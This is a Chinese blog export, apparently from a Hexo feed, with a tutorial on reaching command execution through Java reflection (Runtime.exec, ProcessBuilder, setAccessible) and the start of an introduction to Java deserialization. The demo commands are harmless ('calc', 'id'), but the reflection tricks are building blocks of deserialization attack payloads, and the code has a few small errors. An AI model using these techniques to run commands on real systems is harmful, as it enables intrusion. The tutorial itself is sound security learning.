<h3 id="getclass"><a href="#getclass" class="headerlink" title="getclass()"></a>getclass()</h3><p>当程序里有以及加载的类时可以使用getclass来获取类<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = ClassLoader.getSystemClassLoader().loadClass(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; clazz2= clazz.getClass();</span><br><span class="line">        System.out.println(clazz2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="获取方法"><a href="#获取方法" class="headerlink" title="获取方法"></a>获取方法</h2><h3 id="getMethod"><a href="#getMethod" class="headerlink" title="getMethod()"></a>getMethod()</h3><p>这个函数只能获取一个方法，返回的时一个方法<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException&#123;</span><br><span class="line">        <span class="comment">// 使用 Class.forName 加载类</span></span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取指定方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 打印方法的名称</span></span><br><span class="line">        System.out.println(method);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line"><span class="keyword">public</span> java.lang.Process java.lang.Runtime.exec(java.lang.String) <span class="keyword">throws</span> java.io.IOException</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<h3 id="getMethods"><a href="#getMethods" class="headerlink" title="getMethods"></a>getMethods</h3><p>返回的是一个方法的数组<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException&#123;</span><br><span class="line">        <span class="comment">// 使用 Class.forName 加载类</span></span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取指定方法</span></span><br><span class="line">        Method[] methods = clazz.getMethods();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(Method method:methods)</span><br><span class="line">        System.out.println(methods);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br></pre></td></tr></table></figure></p>
<h3 id="getDeclaredMethod"><a href="#getDeclaredMethod" class="headerlink" title="getDeclaredMethod"></a>getDeclaredMethod</h3><p>用法与getMethod和getMethods一样即可以获取单个也可以获取多个</p>
<h2 id="创建对象实例"><a href="#创建对象实例" class="headerlink" title="创建对象实例"></a>创建对象实例</h2><h3 id="newInstance"><a href="#newInstance" class="headerlink" title="newInstance()"></a>newInstance()</h3><p>这个函数是通过调用类的无参构造方法来实例化对象的，即当要实例化的对象<strong>没有无参构造方法</strong>或者其构造方法为<strong>私有的</strong>时这个函数将无法将对象直接实例化。<br>最常见的便是在实例化Runtime类时<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException,IllegalAccessException,InstantiationException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        Object obj= clazz.newInstance();</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">------------------------------------------------------------------------------------</span><br><span class="line">Exception in thread <span class="string">&quot;main&quot;</span> java.lang.IllegalAccessException: <span class="keyword">class</span> <span class="title class_">Main</span> cannot access a member of <span class="keyword">class</span> <span class="title class_">java</span>.lang.Runtime (in <span class="keyword">module</span> java.base) with modifiers <span class="string">&quot;private&quot;</span></span><br></pre></td></tr></table></figure><br>我们可以看到上面的代码报错了，这是因为Runtime类的构造方法是私有的，所以我们无法直接使用newInstance()得到实例对象，具体怎么得到我会在下文给出</p>
<h4 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h4><p>class.newInstance()</p>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="invoke"><a href="#invoke" class="headerlink" title="invoke()"></a>invoke()</h3><p>这个函数的使用方法如下<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object obj,Object... args)</span></span><br></pre></td></tr></table></figure><br>一般在反射中与newInstance()联合起来用<br>1.如果方法是一个普通方法，那么第一个参数是类对象</p>
<p>2.如果方法是一个静态方法，那么第一个参数是类<br>打个比方我们在正常使用类的方法是安下面的方法来使用的<br><code>[1].method([2],[3],....)</code><br>而invoke是如下方法使用的<br><code>method.invoke([1],[2],[3])</code><br>即其是将实例对象放在了第一个参数里</p>
<h1 id="构造Runtime的命令执行"><a href="#构造Runtime的命令执行" class="headerlink" title="构造Runtime的命令执行"></a>构造Runtime的命令执行</h1><p>首先上文我有提到，Runtime类的构造方法是私有的，即我们使用如下的代码带反射得到exec是会报错的<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(clazz.newInstance(), <span class="string">&quot;id&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><img src="/2024/07/14/java%E5%8F%8D%E5%B0%84/3.png" class="" title="alt text"><br>可是既然开发者给出这个包我们就应该可以使用，而Runtime是单例模式，只能通过Runtime.getRuntime()来得到实例<br><img src="/2024/07/14/java%E5%8F%8D%E5%B0%84/1.png" class="" title="alt text"><br>即我们只要利用invoke来执行Runtime的getRuntime方法就可以得到Runtime的实例对象代码如下<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class clazz=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        Object Run=clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(clazz);</span><br><span class="line">        System.out.println(Run);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------------------------------------------</span><br><span class="line">java.lang.Runtime@2f4d3709</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>可以看到成功通过反射得到了Runtime的实例既然得到了Runtime的实例那么就可以使用Runtime里的所有方法了<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class clazz=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);<span class="comment">//Runtime.getRuntime.exec(&quot;calc&quot;)</span></span><br><span class="line">        clazz.getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(clazz),<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="/2024/07/14/java%E5%8F%8D%E5%B0%84/2.png" class=""><br>可以发现成功使用exec弹计算机（说实话个人感觉这个反射的过程是从后往前看，先看方法在看类。感觉有点像递归）</p>
<h1 id="没有无参构造函数和私有函数构造的反射"><a href="#没有无参构造函数和私有函数构造的反射" class="headerlink" title="没有无参构造函数和私有函数构造的反射"></a>没有无参构造函数和私有函数构造的反射</h1><p>上文我们学了反射的皮毛，对反射有了一定的了解但是还是有两个疑问就是如果没有无参构造函数要怎么构建反射，如果是私有的函数但是没有Runtime的单例模式我们应该怎么来构造反射。</p>
<h2 id="没有无参构造函数构造的反射"><a href="#没有无参构造函数构造的反射" class="headerlink" title="没有无参构造函数构造的反射"></a>没有无参构造函数构造的反射</h2><p>要想构造这个反射我们要先了解一个函数getConstructor()</p>
<h3 id="getConstructor"><a href="#getConstructor" class="headerlink" title="getConstructor()"></a>getConstructor()</h3><p>这个函数与getmethod相似但是这个函数可以获取选定参数的构造方法如下<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getConstructor(List.class);</span><br><span class="line">        System.out.println(constructor);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------------------</span><br><span class="line"><span class="keyword">public</span> java.lang.ProcessBuilder(java.util.List)</span><br></pre></td></tr></table></figure><br>我们可以看到getConstructor()得到了一个参数为<code>List&lt;String&gt;</code>的构造方法。</p>
<h3 id="newInstance-…"><a href="#newInstance-…" class="headerlink" title="newInstance(…)"></a>newInstance(…)</h3><p>这里我们要在讲一下newInstance()，这个我在上文有讲过但是讲的不够详细。newInstance()其实有两种实例化的方式，分别为class.newInstance()和Constructor.newIstance(&lt;参数&gt;)第一种就是我上文说的无参构造实例，而第二种就是利用构造方法和其匹配的参数来进行实例化如下<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getConstructor(List.class);</span><br><span class="line">        Object obj=constructor.newInstance(Arrays.asList(<span class="string">&quot;calc&quot;</span>));</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">java.lang.ProcessBuilder@1d81eb93</span><br></pre></td></tr></table></figure><br>可以发现成功实例化，而newInstance内的参数被传到了实例中。</p>
<h3 id="ProcessBuilder命令执行的反射"><a href="#ProcessBuilder命令执行的反射" class="headerlink" title="ProcessBuilder命令执行的反射"></a>ProcessBuilder命令执行的反射</h3><p>我们首先要了解一下ProcessBuilder，ProcessBuilder内有多种的命令执行构造方法，其中参数也不同，但构造反射的方法大致分为两种。为<br><code>public ProcessBuilder(List&lt;String&gt; command)</code><br><code>public ProcessBuilder(String... command)</code></p>
<h4 id="利用public-ProcessBuilder-List-command"><a href="#利用public-ProcessBuilder-List-command" class="headerlink" title="利用public ProcessBuilder(List command)"></a>利用public ProcessBuilder(List<String> command)</h4><p>要构造这给的反射我们同样先看一下正常的命令执行代码是什么样的<br><img src="/2024/07/14/java%E5%8F%8D%E5%B0%84/5.png" class="" title="alt text"><br>我们可以看到我们只要使用上文的newInstance来创建一个实例，并且传参为List即可再调用Start()即可(<strong>注意start()是ProcessBuilder这个类的内置函数而我们再使用newInstance来创建一个实例时其类型为Object无法调用这个方法，所以在反射时我们还要进行类型的转换</strong>)<br>代码如下<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">((ProcessBuilder)clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc&quot;</span>))).start();</span><br></pre></td></tr></table></figure><br>但是其实我们发现上面的代码其实并不是完全使用反射来写的，我们只要利用invoke来使用start即可以进行强制类型的转换<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc&quot;</span>)));</span><br></pre></td></tr></table></figure></p>
<h4 id="public-ProcessBuilder-String…-command"><a href="#public-ProcessBuilder-String…-command" class="headerlink" title="public ProcessBuilder(String… command)"></a>public ProcessBuilder(String… command)</h4><p>既然我们都知道了<code>List&lt;String&gt;</code>要怎么构造了那么构造这个的难道其实就不大了。<br>要构造这个首先我们要先了解一下变长参数。<br>变长参数就是在创建函数参数不确定数量时使用…来代表，其实变长参数所接受的就是一个数组<br>在底层中下面的两个构造方法的写法其实是一样的<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String[] names)</span> &#123;&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String...names)</span> &#123;&#125;</span><br></pre></td></tr></table></figure><br>即我们才使用这种函数时传的参数其实就是数组，如我们要将一个数组传入hello这个函数那么我们就可以使用如下方法<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] haha=&#123;<span class="string">&quot;lala&quot;</span>,<span class="string">&quot;haha&quot;</span>&#125;;</span><br><span class="line">hello(haha);</span><br></pre></td></tr></table></figure></p>
<p>心态崩了，本来都写完了，结果不知道为什么出了bug没保存下来白写了，下面我就随便写了，烦死了。<br>获取 ProcessBuilder 的第二种构造函数：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getConstructor(String[].class)</span><br></pre></td></tr></table></figure><br>获得其构造函数就可以得到其实例，即可以进行命令执行<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span></span><br><span class="line"><span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;&#125;)).start();</span><br></pre></td></tr></table></figure><br><img src="/2024/07/14/java%E5%8F%8D%E5%B0%84/6.png" class="" title="alt text"><br>其全反射为<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);</span><br><span class="line">clazz.gerMethod(&quot;start&quot;).invoke(clazz.getConstructor(String[].class).newInstance(new</span><br><span class="line">String[][]&#123;&#123;&quot;calc.exe&quot;&#125;&#125;));</span><br></pre></td></tr></table></figure><br><img src="/2024/07/14/java%E5%8F%8D%E5%B0%84/77.png" class="" title="alt text"></p>
<h2 id="私有类的反射构造"><a href="#私有类的反射构造" class="headerlink" title="私有类的反射构造"></a>私有类的反射构造</h2><p>私有类的反射涉及到 getDeclared 系列的反射，与普通的 getMethod 、 getConstructor 区别是：<br>getMethod 系列方法获取的是当前类中所有公共方法，包括从父类继承的方法<br>getDeclaredMethod 系列方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私有的方法，但从父类里继承来的就不包含了<br><img src="/2024/07/14/java%E5%8F%8D%E5%B0%84/8.png" class="" title="alt text"><br>如上我们通过getDeclaredConstructor可以得到私有的无参构造方法<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">m</span> <span class="operator">=</span> clazz.getDeclaredConstructor();</span><br><span class="line">m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(m.newInstance(), <span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure><br>上面的代码可以成功的进行命令执行<br>这里使用了一个方法 setAccessible ，这个是必须的。我们在获取到一个私有方法后，必须用<br>setAccessible 修改它的作用域，否则仍然不能调用。</p>
]]></content>
      <categories>
        <category>java</category>
        <category>反射</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>java反序列化+URLDNS链子</title>
    <url>/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="什么是序列化"><a href="#什么是序列化" class="headerlink" title="什么是序列化"></a>什么是序列化</h1><p>反序列化漏洞,其实在之前的python和php早就接触过了,但是其都没有java那么出名,java耳熟能详的漏洞好像基本都是java反序列化造成的。<br>java的序列化的目的其实和其他语言很相似都是为了远程传输对象，保存对象等。java的序列化会将一个对象处理成一段二进制的字符，这使得传输效率的提高和存储空间的下讲，对提升性能来说是非常重要的。下面我来演示一些序列化和反序列化的过程</p>
<h1 id="序列化和反序列的代码实现"><a href="#序列化和反序列的代码实现" class="headerlink" title="序列化和反序列的代码实现"></a>序列化和反序列的代码实现</h1><h2 id="类person-java"><a href="#类person-java" class="headerlink" title="类person.java"></a>类person.java</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实现 Serializable 接口，表示该类可以被序列化和反序列化</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//有参构造方法，实现赋值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">person</span><span class="params">(String name,<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//标识方法或接口是重写的</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">//重写了 Object 类中的 toString() 方法</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name = &#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;,age = &quot;</span> + age + <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的类用重写了toString这样当我们使用System.out.println来输出类时就会输出改类的name和age俩个成员属性。<br>想要使一个类被序列化就需要完成接口Serializable。<br><img src="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png" class="" title="alt text"><br>我们可以发现这个接口其实时空的，所以我们不需要完成这个接口的任何方法。这个接口的目的其实是为了给我们的类上一个标记告诉JVM这个是可序列化的类而已</p>
<h2 id="序列化类Ser-java"><a href="#序列化类Ser-java" class="headerlink" title="序列化类Ser.java"></a>序列化类Ser.java</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.DoubleSummaryStatistics;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Ser</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        FileOutputStream bos=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">person</span>(<span class="string">&quot;LSE&quot;</span>,<span class="number">19</span>);</span><br><span class="line">        Serializ(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的代码注意是利用oos.writeObject(obj);来向序列化后的内容写入一个对象的。我们将反序列化后的字符利用SerializationDumper来查看会发现<br><img src="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png" class="" title="alt text"><br>类的内容位于classAnnotations下。</p>
<h2 id="反序列化UnSer-java"><a href="#反序列化UnSer-java" class="headerlink" title="反序列化UnSer.java"></a>反序列化UnSer.java</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInput;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnSer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unserializ</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Object person=Unserializ(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>反序列化是通过readObject()来进行的。</p>
<h1 id="反序列化的过程"><a href="#反序列化的过程" class="headerlink" title="反序列化的过程"></a>反序列化的过程</h1><p>要想知道如何进行反序列攻击首先得了解原型反序列化的过程。<br>我们来下一个反序列化的断点来看看反序列化的过程。<br><img src="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png" class="" title="alt text"><br>再进入readObject后进一步调试会发现其进入了readObject0步入<br>方法的前半不部分是处理块数据的，不重要我们直接看其处理对象的过程<br><img src="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png" class="" title="alt text"><br>我们会发现其一个一个字节的进行读取，来读取其类描述符，再switch函数中不同的类描述符会进入不同的方法，因为我们传入的是个对象所以会进入TC_OBJECT中<br><img src="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.png" class="" title="alt text"><br>进入了readOrdinaryObject方法里<br><img src="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png" class="" title="alt text"><br>再这个方法里我们会发现如上的判断，hasReadResolveMethod这个方法是用来判断传入的类是否有重写readObject的，如果重写了则直接调用invokeReadResolve这个方法来处理。我们进入invokeReadResolve<br><img src="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png" class="" title="alt text"><br>我们会发现其会判断其重写的readObject是否为空不为空则使用反射来调用这个方法</p>
<p>那么这时候我们就知道了，只要序列化的类中有重写readObject的，再反序列时就会调用这个类。说起来这个readObject就和php的<code>__destruct很像</code>重写了的readObject就和<code>__destruct</code>一样算是反序列漏洞的入口。</p>
